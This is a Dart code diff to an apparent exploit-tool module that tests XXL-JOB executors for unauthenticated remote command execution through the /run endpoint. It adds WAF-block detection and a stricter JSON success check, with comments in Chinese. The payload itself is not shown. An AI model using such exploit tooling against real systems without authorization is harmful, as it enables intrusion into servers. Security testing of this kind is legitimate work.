@@ -1,6 +1,7 @@
 import 'dart:convert';
 
 import 'exp_result.dart';
+import 'waf_detect.dart';
 import '../../../core/http/http_client.dart';
 
 class XxlJobExpService {
@@ -43,8 +44,31 @@ class XxlJobExpService {
         body: payload,
       );
       final body = res.body ?? '';
-      if (res.statusCode == 200 && body.contains('200')) {
-        return ExpResult(true, 'XXL-JOB 未授权 RCE', '执行器接口未授权，命令提交成功');
+      if (looksLikeWafBlock(res.statusCode, body)) {
+        return ExpResult.probeFailed(
+          'XXL-JOB 未授权 RCE',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
+      // 必须是执行器返回的业务 code=200；旧实现只要响应体出现 "200" 就算命中，
+      // 连 404 页面的 "404" 里都可能误判（例如 {"code":404}）。
+      var accepted = false;
+      String? msg;
+      try {
+        final decoded = jsonDecode(body);
+        if (decoded is Map && decoded['code'] == 200) {
+          accepted = true;
+          msg = '${decoded['msg'] ?? ''}';
+        }
+      } catch (_) {
+        accepted = RegExp(r'"code"\s*:\s*200').hasMatch(body);
+      }
+      if (accepted) {
+        return ExpResult(
+          true,
+          'XXL-JOB 未授权 RCE',
+          '执行器 /run 未授权调用成功${msg == null || msg.isEmpty ? '' : '（$msg）'}',
+        );
       }
     } catch (e) {
       return ExpResult.probeFailed('XXL-JOB 未授权 RCE', '探测失败: $e');
